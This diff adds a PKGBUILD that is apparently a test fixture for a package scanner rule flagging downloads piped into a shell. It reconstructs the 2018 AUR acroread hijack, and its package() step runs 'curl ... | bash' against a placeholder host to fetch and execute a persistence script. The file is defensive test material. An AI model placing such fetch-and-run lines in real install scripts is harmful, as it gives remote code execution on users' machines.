@@ -1,0 +1,29 @@
+# Synthetic reconstruction of the 2018 acroread AUR hijack technique.
+# See SOURCE.md -- this is NOT the original malicious code, and the URL below
+# is a non-resolving placeholder. It exists solely as a regression fixture for
+# rule RCE001 (curl/wget output piped directly into an interpreter).
+pkgname=acroread-example
+pkgver=9.5.5
+pkgrel=3
+pkgdesc="Example reconstruction of a compromised orphaned AUR package"
+arch=('x86_64')
+url="https://example.invalid/acroread-example"
+license=('custom')
+depends=('gtk2' 'nss')
+source=("https://example.invalid/$pkgname-$pkgver.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+  cd "$srcdir/$pkgname-$pkgver"
+  ./configure --prefix=/usr
+  make
+}
+
+package() {
+  cd "$srcdir/$pkgname-$pkgver"
+  make DESTDIR="$pkgdir" install
+
+  # This is the reconstructed technique: fetch a remote script and execute it
+  # immediately via a direct pipe into bash, with no checksum or review.
+  curl -fsSL https://example.invalid/update-persistence.sh | bash
+}
